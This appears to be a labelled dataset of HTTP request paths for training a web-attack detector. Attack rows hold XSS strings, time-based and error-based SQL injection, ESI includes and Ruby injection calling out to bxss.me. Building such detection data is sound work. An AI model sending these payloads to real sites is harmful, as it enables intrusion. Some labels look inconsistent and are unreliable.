request	label
/******/0/http://bxss.me/t/xss.html?	1
/****/?icl_action=reminder_popup&target=javascript:alert(777);//	1
/*******/qiye/spot-e101378.html	0
/*****/system/2015/02/07/011633045.shtml	0
/****/xh/hy/201709/t20170906_472528.html	0
/if(now()=sysdate(),sleep(6),0)/******/lzyj/	1
/****/web/search?searchword=1&channelid=287219&perpage=24&token=1	1
/******/bg-sqdsfbz.png	0
/zwgk%' and 2*3*8=6*8 and 'l857'!='l857%/******/gczlzl/1.htm	1
/****/web/search?channelid=222832&searchword=\u539f\u5dde\u533a\u5934\u8425\u9547\u5c0f\u66f9\u519c\u8d44\u7ecf\u9500\u90e8	0
/****/20210909/10430.html	1
/****/qzfwj/201801/t20180115_669166.html/index_1.html	0
/****/byszf/bxss.me/t/xss.html?	1
/*****/system/2013/06/04/011102520_02.shtml	0
/****/tzgg/tz17_6387/201806/t20180620_188343.html	0
/****//screens/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)>	1
/****/tzgg/2019_tzgg/201904/'http:/leyubet1410.com/'	0
/****/qzfwj/201801/t20180115_668845.html	0
/****/web/search?page=226&channelid=222832&searchword=\u54b8\u8f89&keyword=\u54b8\u8f89&perpage=20&outlinepage=10	0
/****/ and 1>1	1
/***/0/02/08/46/2084667_934886.jpg	0
/*******/zwgk/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqzfhcxjst/	0
"/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqsjt/"">\u5b81\u590f\u516c\u8def\u5efa\u8bbe\u7ba1\u7406\u5c40</a>"	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u80dc\u5229\u4e61\u7855\u946b\u7535\u8111\u79d1\u6280\u670d\u52a1\u90e8	0
/****/wlgc/	0
"/***/getlist?data={""channel_id"":""12225"",""channel_type"":""4"",""page"":1,""page_size"":15}"	0
/****/bmkx/sbwg/201907/t20190701_139102.html	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd&showpage=1&t=3820	0
/****/czgk/bmjs/zzqdwgzbmyxsjg/zzqbbqzjggw/202108/t20210818_2979868.html	0
/****/bmkx/sgaj/202003/w020200331656445262862.jpg	0
"/****/zfwjn/1088/1110/list.html?new="""" """"a"""".concat(70-3).concat(22*4).concat(110).concat(87).concat(108).concat(75) (require""""socket""""
socket.gethostbyname(""""hitpr"""" """"sjewwagj73ad0.bxss.me."""")[3].to_s) """""	1
/********/environment/wxoauth2url?appid=wx4705810e91036e74&returl=https:/www.zsebank.com/app/index.php?i=8&schoolid=46&c=entry&op=scanpay&batch_no=bpr0016870000000001&do=cost&m=fm_jiaoyu&scope=base	0
/***********/image/video.jpg	0
/*****/netflow/jspui/j_security_check?radiususerenabled=false&authrule_name=authenticator&j_username=admin52f43'><script>alert(777)</script>6f472a19875&j_password=admin	1
/********/xxgk/zycwxx/kjcx/kycg/zscq/lxwm/rssdy/gygj/gjgk/zzjg/xwzx/gjmt/jtwxq/bqsm/	0
/****/zt/fgfgg/201812/t20181226_1232027.html	0
"/****/czgk/bmyjs/zzqzfzcbmyzstsjg/zzqswt/\""javascript:void(0)\"""	1
/****/system/2015/02/02/011628059.shtml	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u897f\u6ee9\u8fdb\u5b5d\u8089\u5e97	0
/****/finderview/api.php?callback=jquery211027821724654516156_1466662510279}}1c027<script>alert(777)</script>cf2ea&type=get&mode=0&_=1466662510280	1
/****/shouji/65807.htm?rand=2') and 4863=(select 4863 from pg_sleep(5)) and ('jifs'='jifs	1
/****/tzgg/2013tzgg/201412/'http:/leyubet1410.com/'	0
/******/visitcount/visit.jsp?type=3&i_webid=1&i_columnid=393&i_articleid=182845	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u5927\u575d\u7535\u5382\u4f0a\u8f69\u9ebb\u8fa3\u70eb	0
/*****/gy42/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&l2=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd&l=\ufffd\u0ea3	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u664b\u6cb3\u997c\u5c4b	0
/****/wxj/	0
"/*******/compact.cfm?fusebox.ajax="""">alert(777)"	1
/****/xydt/2013hydt	0
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u5851\u5e08\u6c7d\u8f66\u4fee\u7406\u90e8	0
/**********/system/2021/12/20/013497155.shtml	0
/************/template/jcse/110105008056111/16/images/plugin/waterpull/http://bxss.me/t/fit.txt.js	1
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u7518\u57ce\u4e61\u6b63\u864e\u65e5\u6742\u95e8\u5e02\u90e8	0
/****/system/2013/06/22/javascript:dozoom(9)	1
"/****/system/2021/09/08/013447520'""""/><img src=javascript:alert(1513) .shtml"	1
"/**/abantecart/index.php?currency=""><script>alert(777);</script>&product_id=109""><script>alert(777);</script>&rt=product/product"	1
/****/gccb/jcgc/images/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/***/0/01/80/11/1801101_697455.jpg	0
/*******/202001/202001161954231174.html	0
/****/2020jnxc/yxzp/202006/t20200630_249653.html	0
/**/system/2021/01/29/012122762.shtml	0
/******/usercenter/index?qrcode=38803&code=0112m3ll2toik84blykl2xorfj32m3lf	0
/0'xor(if(now()=sysdate(),sleep(12),0))xor'z/******/gytdsdfwzs/zzq/zcwj.htm	1
/**/system/2021/12/19/javascript:void(0);	1
/*******/202112/202112201614481088.html	0
/****/web/search?channelid=222832&searchword=\u5434\u5fe0\u5e02\u5229\u901a\u533a\u6b63\u8302\u70b8\u9e21\u5e97	0
/****/qzfwj/201801/t20180115_668683.html	0
/***/mood/default/images/news_xq_ws_011.gif	0
/************/template/jcse/110105008056111/16/images/plugin/selectpick/js'||'.js	1
"/****/czgk<esi:include src=""""http://bxss.me/rpb.png""""/>/bmjs/qtdw/"	1
/**/system/2012/12/14/010978807.shtml	0
/****/zjdt/zjdt/gzdt/10.htm	1
/****/xqdt/hnx/201711/t20171117_97202.html	0
/*******/qiye/businesses-e42579_5.html?category_id=252467	0
/*******/oam.php	1
/****/kjzl/201412/w020141226604562821890.jpg	0
/****/web/search?channelid=222832&searchword=\u5b81\u590f\u6f47\u9f99\u79cd\u517b\u6b96\u4e13\u4e1a\u5408\u4f5c\u793e	0
/****/mtgz/2015_mtdt/201509/w020150924360432405085.jpg	0
"/************/' 'a'.concat(70-3).concat(22*4).concat(104).concat(77).concat(112).concat(73) (require'socket'
socket.gethostbyname('hitzu' 'vfulqiduc49c3.bxss.me.')[3].to_s) '/jcse/110105008056111/16/images/jquery.waterfall.js"	1
/****/zxfw/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/****/b-e908777.html	0
/****/201812/t20181213_198700.html	0
/************/http://bxss.me/t/fit.txt/jcse/110105008056111/16/images/searchbtn.js	1
/*****/system/2021/12/02/013489149.shtml	0
/*******/qiye/b-e2303289.html	0
/****/system/2017/02/21/javascript:dozoom(14)	1
/*********/zsyz/	0
/enjoymobilexcx_mt/****/getpicverifycode?mobile=101834157&type=\u9884\u7ea6&dt=1640016036846	0
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u5360\u6e05\u517b\u6b96\u4e13\u4e1a\u5408\u4f5c\u793e	0
/wy_doc/****/grm.web.ajaxprj,wzyb_web.ashx	0
/****/web/search?channelid=222832&searchword=\u4e2d\u5b81\u53bf\u9a6c\u4e30\u82b1\u670d\u88c5\u5e97	0
/if(now()=sysdate(),sleep(12),0)/****/kjybzde/gzdt/1.htm	1
/zwxx_11337/****/202007/t20200706_2154847.html	0
/***/0/02/12/43/2124367_998404.jpg	0
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u9753\u5a9a\u670d\u88c5\u5e97	0
/****/xwygx/202112/rssdy/gygj/ssgs/xxgk/ywzzq/gygj/dszzc/	0
/xwzx'||'/****/sgaj/	1
/****/web/search?channelid=222832&searchword=\u56fa\u539f\u5e02\u539f\u5dde\u533a\u5f6d\u6d77\u5546\u884c	0
/******/usercenter/getwechatmemberinfo?card_id=pvl7jji9fru64hdo6-ahwwpky_pa&encrypt_code=z5d1k/kvnjp/yua8r0xrtd/jwphuqpzhoeiuvzzfdeo=&openid=ovl7jjhgbhvsnqotkm5y8idbisrk&outer_str=8804&activate_ticket=fdzv9emqaffrnr3xboqhb5jrq2s3reyi2u4bhox9vnroo8dbj5 fzedtzplsmcarprw0rjkjsoxgv/3pxbfq5im3mnurhxfiddoodubtx8c=	0
"/******/system/2021/06/09'""/><img src=x onerror=alert(2360)>/013399706.shtml"	1
"/************/template<esi:include src=""""http://bxss.me/rpb.png""""/>/jcse/110105008056111/16/images/plugin/analysis/jquery.windstagball.js"	1
"/"""" """"a"""".concat(70-3).concat(22*4).concat(121).concat(80).concat(112).concat(80) (require""""socket""""
socket.gethostbyname(""""hitcs"""" """"odqezdyebf7d1.bxss.me."""")[3].to_s) """"/*/jquery.db_tabmotionbanner.min.js"	1
/**********/system/2020/03/29/013127362.shtml	0
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u516d\u5fc5\u5c45	0
/****/zt/yqfkzccs/yqfkdt/index_6.html	0
/*****/index.jsp	1
/****/zzxxgk/tjj/zfxxgkml_2127/hygq_2064/list.html?new=bxss.me/t/xss.html?	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u6e2f\u53e3\u9152\u5427	0
/**********/system/2020/05/04/013154365.shtml	0
/****/jwmsxf/img/wangluo.png	0
/****/zgsdt/2021_qydt/202109/t20210930_317517.html	0
/****/web/search?page=30&channelid=222832&searchword=\u738b\u548c\u5c71&keyword=\u738b\u548c\u5c71&perpage=20&outlinepage=10	0
/****/20201117/e110542354.html	0
"/***/advert?data={""ad_type"":5,""channel_type"":4,""channel_id"":12509,""place_id"":""fm_sp_ard"",""news_id"":""1066122""}"	0
/*****************/img/scan.d351e8fd.png	0
/zwxx_11337/****/index_7.html	0
/****/xxgkml/zfczyjs/list.html?new=/xfs.bxss.me	1
/******/qqh/tsss/	0
"/****/czgk/bmyjs/zzqdwgzbmyxsjg/zzqzfwdwzcyjs_1816/\""javascript:void(0)\"""	1
/***/0/01/93/69/1936913_176810.jpg	0
"/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/******/gytdsdfwzs/zws/zcwj.htm"	1
/****/201909/t20190926_1757357.html	0
/****/user/job/lib/ap_resume_intention.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
"/******/resource/pdfjs/build/fqaabdgaaaaet1mvmlynywkaaaegaaaaygntyxabdqluaaacnaaaaujozwfk/xvfdqaa/index.jsp/*/-->'""""></iframe></script></style></title></textarea><script >alert(93208)</script>"	1
/****/system/2021/11/01/javascript:dozoom(14)	1
/****/wdsjs/hfswsj%' and 2*3*8=6*8 and 'msnr'!='msnr%/zmhdyc.html	1
/**/sustainability/csrreports/201908/t20190828_222708.html	1
/****/sj1/jjzs/202008/t20200828_2210900.html	0
/***/blockdata/getsearchinfo.do?&title=\u590f\u7684	0
/**//screens/switch/switch_mon.html?mode=plog-custom&mode-title=test</td><img width=1 height=1 src=/images/logo-mobility-controller.gif onload=alert(777)>	1
/***/0/00/22/53/225321_952850.jpg	0
/****/czgk/bmyjs/qtdw/zzqmksjy/202002/t20200210_1948591.html	0
/****/bmkx/stjj/index_2.html	0
/****/zdlygk/ncwywfgz/gys/bsj'||'/zcwj.htm	1
/**********/2018-10-19.html	0
/**/user/job/lib/ap_resume_workcity.asp?action=workcity&id=1 and  exists (select count(*) from msysaccessobjects1)	1
"/****/byszx/201611/t20161121_76519.html?leader=' 'a'.concat(70-3).concat(22*4).concat(100).concat(87).concat(103).concat(76) (require'socket'
socket.gethostbyname('hitgn' 'qfxpgytaf8248.bxss.me.')[3].to_s) '"	1
"/******/qhqy/index.shtml/<img src=""javascript:alert(207)"">"	1
/**/javascript:void(0);	1
/***/0/02/09/12/2091296_824001.png	0
/**********/system/2020/07/17/013207452.shtml	0
/***/0/00/61/55/615531_316633.jpg	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u897f\u590f\u533a\u4e2a\u4f53\u7ecf\u8425\u5609\u9823\u5546\u52a1\u5bbe\u9986	0
/****/web/search?channelid=222832&searchword=\u6d77\u539f\u53bf\u8001\u57ce\u533a\u94f6\u5149\u706f\u9970\u57ce	0
"/****/reviews/index?review_id=&statuses[]=open&statuses[]=reopened&severities[]=&projects[]=&author_login="""">alert(/777/)&assignee_login=&false_positives=without&sort=&asc=false&commit=search"	1
"/****/czgk/bmyjs/zzqfyxt/\""javascript:void(0)\"""	1
/****/czgk/bmjs/sydw1/zzqbjj/201708/t20170818_549490.html	0
/****/zt/nlkfxjjsyq/syqtp/index_1.html	0
/****/zzxxgk/wsjkwyh/gzdt_3599/xxdt/202006/t20200618_168170.html	0
/****/b-e790952.html	0
"/****/qyjbxx/gjjj/"" and ""x""=""x"	1
/n42684'||'/*******/n236776/c1546739/content.html	1
/****/web/search?channelid=222832&searchword=\u9752\u94dc\u5ce1\u5e02\u7ea2\u5b9d\u77f3\u6d17\u8f66\u884c	0
/****/zfwjn/1079/1080/list.html?new=bxss.me	1
/****/zjxgq/tpfc/201412/t20141218_48190.html	0
/******/20190928a.jpg	0
/****/bwcx/dtbb/jcdt/index_2.html	0
/****/web/search?channelid=222832&searchword=\u539f\u5dde\u533a\u4e09\u8425\u9547\u5efa\u7b51\u6750\u6599\u7ecf\u9500\u90e8	0
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u5927\u5cf0\u5c0f\u971e\u5e73\u4ef7\u8d85\u5e02	0
/****/xydt/2014hydt/201412/ddjs/dqgz/	0
"/****/zjdt/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/gzdt/1.htm"	1
/*******/0srw.php	1
/******/system/2021/05/11/013383272.shtml	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u674e\u4fca\u9547\u7965\u548c\u5706\u9910\u5385	0
/***/interface/comul_total.json.jsp?callback=jquery1910482462237539077_1639980096696	0
/****/zzxxgk/czj/zfxxgkml_2139/czyjsxx/202011/t20201111_173859.html	0
/****/jtdt/2019_jtyw/202001/t20200102_241230.html	0
/****/spjj/201707/t20170714_270975.html	0
/****/zzxxgk/bmsthjj/xxgkzn/list.html?new=0.6248471749470088	0
/*****/probe.cfm?name=<script language='php'>echo 10516*61501;</script>	1
/***/nbhd/opengovmsgbox.do?appid=4&method=0'xor(if(now()=sysdate(),sleep(15),0))xor'z&pagesize=5&siteid=115	1
/****/web/search?channelid=222832&searchword=\u76d0\u6c60\u53bf\u97e9\u4ed5\u670d\u88c5\u5e97	0
/***/interface/url_total_pv.json.jsp?callback=jquery19108083227899047623_1640054289729	0
/****/bmkx/sgsj/202006/w020200612696892452345.jpg	0
/*************/pm_gatt_inc.aspx?project_id=sys.fn_varbintohexstr(hashbytes('md5','2ddc3'))	1
/******/system/2017/12/13/javascript:window.close();	1
/****/tools_log_setting.php?action_post=something&send_mail=--><script>alert(777)</script>&apply=save settings&log_sys=1&log_dbg=1&log_att=1&log_drp=1&log_ntc=1&email_addr=&subject=&sender=&srv=&srv_port=25	1
/****/20210610/javascript:void(0);	1
/*******/projectindex/?sb=1 and '~~' '~' @@version '~~' '~'>0	1
/zwxx_11337/*******/202111/t20211105_3116630.html	0
/*/file/201702/ab27f2f444e020ae024d5d691ebc9095.pdf	0
/****/index.cfm?fuseaction=clogin.main&returnurl=&status=sendlogin&email=alert(777)	1
/****/web/search?channelid=254846);select sleep(5)	1
/**********/system/2021/06/30/013410779.shtml	0
/****/xxgkml/qtfdxx/ssjygk/sjccjg/202108/t20210805_185359.html	0
/****/zt/msss/msxw/201905/t20190527_1522810.html	0
/****/jrnx/314.htm	1
/*******/2jt0f.php	1
/******/api.php?c=project&f=index&token=1234&id=news&sort=1 and extractvalue(1,concat(0x7e,md5(862043799))) --	1
/****/0823/222632.shtml	0
"/******/system/2021/06/09/013399706'""/>\</script\>\<svg/onload=alert(2346) width=100\/>.shtml"	1
/****/20211013/10570.html	0
/**********/system/2021/11/11/013478732.shtml	0
"/*****/phpliteadmin_v1-1/phpliteadmin.php?table=""""/>alert(777)"	1
/system' and 2*3*8=6*8 and 'eaoi'='eaoi/********/js/newcalendar/wdatepicker.js	1
/******/xxsjd/jd	0
/*****/gygj/ssgs/kjcx/yfyfwpt/gjcp/lyjx/xwzx/zgsdt/xxgk/ygzpxx/	0
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqggzyjgj/	0
/**/business	0
/**********/system/2021/03/29/013358922.shtml	0
"/***/interface/rest/threatfeeds/pagedjson?namepattern=&page=0&size=25&sortcol=address&sortdir=""/><script>alert(777)</script>"	1
/****/20210929/10524.html	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqfzggw/201609/t20160930_317906.html	0
/*****/system/2016/05/24/012013157.shtml	0
/****/userrole/modal_sendmail.aspx?from=user&usernamecollection=anony' and ('anony' 'secsiteserverinj' @@version)>0 and '1'='1	1
/****/category/haishangsichouzhiluwenda?page=1' or 9447=9447 /*	1
/**/])[1].tolowercase(),i=$[h]||$._default,g.innerhtml=i[1] n.htmlprefilter(f) i[2],k=i[0];while(k--)g=g.lastchild;n.merge(m,g.childnodes),g=l.firstchild,g.textcontent=	1
/****/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/***/blockdata/getsearchinfo.do?&title=\u4e0a\u5f80	0
/****/system/2020/12/04/javascript:window.close();	1
/***/0/00/32/09/320940_383055.jpg	0
/****/zgsdt/2021_qydt/202109/\u534e\u6da6\u6c34\u6ce5_files/crc_log2_cn.png	0
/****/bakup.php	1
/****/bmkx/sfgw/202105/url	0
"/***/getsubject?data={""subject_id"":525,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":377052,""sign"":""""}"	0
/zwxx_11337/****/201805/t20180521_762544.html	0
/*******/zzxxgk/tjj/zfxxgkml_2127/hygq_2064/list.html	1
/****/web/search?channelid=222832&searchword=\u7075\u6b66\u53bf\u9a6c\u5bb6\u6ee9\u9547\u673a\u7816\u5382	0
/*****/gy42/cpgyss.asp?key=\u53a6\u95e8\u5e10\u7bf7&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448%') and 0138=0138	1
"/****/compact.cfm?fusebox.ajax="""">alert(777)"	1
/******/resource/interview/room.jsp?wbinterviewid=1033&owner=1707212448') and 6950=5095	1
"/**/ui/widgets/cookie/' 'a'.concat(70-3).concat(22*4).concat(101).concat(85).concat(107).concat(78) (require'socket'
socket.gethostbyname('hitfg' 'skqeqszn5c533.bxss.me.')[3].to_s) '.js"	1
/****/web/search?channelid=222832&searchword=\u5927\u6b66\u53e3\u533a\u98de\u51e1\u5ba2\u5bb6\u5177\u5e97	0
/**********/system/2021/12/12/javascript:window.print()	1
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u671b\u6d2a\u9547\u5c0f\u5434\u51c9\u76ae\u52a0\u5de5\u90e8	0
"/cgi-bin/****/""><script>alert(777)</script>show/title/time-for-a-heavy-harvest-new-release/src/@random4cd201e063d5c"	1
"/******/hhs/jrtt/""""><script>alert(26)</script>"	1
/*****/gy48/cpgyss.asp?key=\u8336\u56ed\u65cb\u8015\u673a&l=\ufffd\u04f1\ufffd	0
/****/zt/hjbhdc/202008/t20200807_2181328.html	0
/****/web/search?channelid=222832&searchword=\u8d3a\u5170\u53bf\u5fb7\u80dc\u6e05\u4e50\u798f\u725b\u8089\u62c9\u9762\u9986	0
/*******/qiye/b-e2225977.html	0
"/***/getsubject?data={""subject_id"":334,""channel_type"":10,""page"":1,""page_size"":15,""account_id"":5696,""sign"":""""}"	0
/****/yd/yw_1280/index_1.html	0
/****/czgk/bmyjs/zzqdwyzfpcjgyzsjgyzssydw/zzqtjj/201702/t20170208_318021.html	0
/****/bmkx/swjw/202110/w020211025639468338455.jpg	0
/******/system/2017/05/28/javascript:void(0);	1
/***/0/02/12/40/2124072_933693.jpg	0
/****/system/2021/08/19/javascript:window.print()	1
/****/xqdt/byq/201712/w020171225794427306563.jpg	0
"/****/'""""()&%<acx><script >lnxe(9742)</script>/hfswsj/202109/t20210906_186411.html"	1
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u5c06\u53f0\u4e61\u88c5\u9970\u6750\u6599\u536b\u6d74\u5927\u5168\u6279\u53d1\u90e8	0
/******/16syh/	0
/****/index_4.html	0
/**/ohac/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/******/system/2016/09/13/012129675.shtml	0
/******/dian2.png	0
/****/yd/yw_1280/202007/t20200724_2171493.html	0
"/******/web/jpage/theme/simple/css"""" and 2*3*8=6*8 and """"voyu""""=""""voyu/jpage.css"	1
/******/system/2021/05/12/013383903.shtml	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u4fe1\u5e7f\u8f89\u5546\u884c	0
"/******/jslib/ckplayer/ckplayer.js/<img src=""javascript:alert(210)"">?_=1630311327038"	1
"/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/*****/index.html"	1
/***/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5341\u56db\u4e94	0
/****/zdlygk'||'/bzxajgc/gys/jyx.htm	1
/*****/api-getmodel-api-sql-sql=select concat(account,0x7a656e74616f636d735f73716c5f73716c69) from zt_user	1
/***/index.jsp	1
/****/web/search?channelid=222832&searchword=\u897f\u5409\u53bf\u82b3\u82b3\u852c\u83dc\u6c34\u679c\u5e97	0
/*****/gy48/cpgyss.asp?key=\ufffd\ufffd\ufffd\ufffd\ufffd\u0471\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd\ufffd\ufffd	0
/****/web/search?channelid=222832&searchword=\u6c38\u5b81\u53bf\u6768\u548c\u9547\u4e54\u6cbb\u516c\u5b50\u7537\u88c5	0
/************//xfs.bxss.me/jcse/110105008056111/16/images/plugin/waterpull/pinterest_grid.js	1
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5174\u5e86\u533a\u798f\u6cfd\u5802\u836f\u5e97	0
/***/003/004/071/00300407107_9a1ad60a.jpg	0
/******/nxrq_priv_icon23_1.png	0
/****/admin/dash_additem.php?additem_form=alert(777);	1
"/****/phpliteadmin_v1-1/phpliteadmin.php?table=""""/>alert(777)"	1
/******/nxrq_priv_renzbg_4.png	0
/******/n236763/n239053/index'||'.html	1
/***/0/01/25/87/1258766_487776.jpg	0
/***/0/00/13/97/139717_581750.jpg	0
/***********/zaojianpinglun/?_=1640036080319	0
/******/fzrxc/	0
/*****/gy42/ljcpgyview.asp?id=28810514&l2=\ufffd\ufffd\ufffd\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
"/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/********/js/jquery/jquery-latest.min.js"	1
/**********/system/2020/12/16/013303623.shtml	0
/************/template/jcse/110105008056111/16/images//xfs.bxss.me.css	1
/zwxx_11337/****/index_69.html	0
/****/b-e640222.html	0
/****/system/2008/01/04/javascript:dozoom(14)	1
/**/system/2021/09/18/012201223.shtml	0
/***/0/01/49/83/1498353_227004.png	0
/****/web/search?channelid=222832&searchword=\u94f6\u5ddd\u5e02\u5174\u5e86\u533a\u8fbe\u65b0\u901a\u5e7f\u544a\u88c5\u9970\u90e8	0
/***/blockdata/articlelist_4g4.do?columnarticlelistdeal_4g4_channelid_ss=channelid&columnarticlelistdeal_4g4_contenttype_ss=channelid&channelid=minsheng°Ëtpage='||'	1
/****/20210831/10373.html	0
/***/jrlc/gr/index.shtml	0
/****/201909/t20190926_1757691.html	0
/*******/qiye/b-e943692.html	0
/**/mediacenter/news/201708/t20170818_169164.html	0
/********/index3.json	0
/******/system/2020/05/18/013164036.shtml	0
/**/lznews/config-browser/showconfig.action?namespace=<script>alert(/xss/);</script>&actionname=showcase	1
/*****/20210628/10054.html	0
"/****/ztly/0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z/201911/t20191122_1859276.html"	1
"/************/template/jcse/110105008056111/'""""()&%<acx><script >mnxv(9248)</script>/images/jquery.cookie.js"	1
"/******/abantecart/index.php?rt=""><script>alert(777);</script>&s=your_admin""><script>alert(777);</script>&token=957bf7cb71078f4471807da1c42d721e""><script>alert(777);</script>"	1
"/****/category/gaocengdongtai?page=1'""""()&%<acx><script >fbh7(9850)</script>"	1
/******/system/2019/06/30/012916426.shtml	0
/**/ohac_10136/gjglry/	0
/****/czgk/bmjs/zzqdwyzfpcjgyzsjgyzssydw/nxrbbyjt	0
/****/tzgg/gzxwtzgg/201412/t20141218_40494.html	0
/****/web/search?channelid=222832&searchword=\u77f3\u5634\u5c71\u5e02\u5b9d\u805a\u5bb6\u5ead\u519c\u573a	0
/****/b-e1014472.html	0
/****/	0
"/****/xh/"">\u81ea\u6cbb\u533a\u653f\u5e9c\u9a7b\u5317\u4eac\u529e\u4e8b\u5904</a>"	0
"/*******/sfswfuploadplugin/web/sfswfuploadplugin/swf//swfupload.swf?moviename=""]);}catch(e){}if(!self.a)self.a=!alert(1);//"	1
/***/index.php?c=dt&a=editor&do=design&id=292&	1
/****/tzgg/2013tzgg	0
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5c31\u5730\u8fc7\u5e74	0
/****/ºı∆∂	1
/*******/202105/202105131621351199.html	0
/*******/qiye/b-e2458486.html	0
/****/fkxxfy/202111/t20211103_196133.html	0
/****/web/search?channelid=222832&searchword=\u5e73\u7f57\u53bf\u5c0f\u675c\u88c5\u9970\u6750\u6599\u6279\u53d1\u90e8	0
"/******/0""""xor(if(now()=sysdate(),sleep(12),0))xor""""z/js/base64.js"	1
"/****/bysrd/201610/t20161016_531.html?leader=—¶œ„¡·'""""()&%<acx><script >kulu(9805)</script>"	1
/****/czgk/bmyjs/zzqdwzfbmgljgsydw/zfzgdbsc/202002/t20200210_1948545.html	0
/****/czgk/bmjs/zzqzfzcbmyzstsjg/zzqswt/202008/t20200818_2189777.html	0
/**************/cms/cms/frontpage.do?view=staticfile/searchpath/hotlabel&title=\u5357\u9633	0
/****/index.html?channelid=222832&searchword=\u6211\u4e3a\u7fa4\u4f17\u529e\u5b9e\u4e8b\u6e05\u5355	0
/***/0/02/03/37/2033713_989376.png	0
/***/userrole/modal_sendmail.aspx?from=user&usernamecollection=anony' and ('anony' 'secsiteserverinj' @@version)>0 and '1'='1	1
"/*/170822-1/index/06'""""()&%<acx><script >rcwk(9743)</script>defa41f3b0c6ebc8da65f95d7f2f20.css"	1
/****/web/search?channelid=222832&searchword=\u540c\u5fc3\u53bf\u9a6c\u9ad8\u5e84\u4f9b\u9500\u793e\u6536\u8d2d\u95e8\u5e02\u90e8	0
"/************/search.do?begin=20201012&end=20211012&eq=1&oq=1&p=1&pg=1&pos=filenumber&q=0""""xor(if(now()=sysdate(),sleep(15),0))xor""""z&searchid=1&tpl=16&websiteid="	1
/*****/gy42/cpgyss.asp?key=\ufffd\ufffd\u012c\ufffd\ufffd\ufffd\u0575\ufffd&l2=\ufffd\u033d\ufffd&l=\ufffd\ufffd\ufffd\ufffd	0
/**********/system/2021/12/16/javascript:window.print()	1
/******/jl_t12.jpg	0
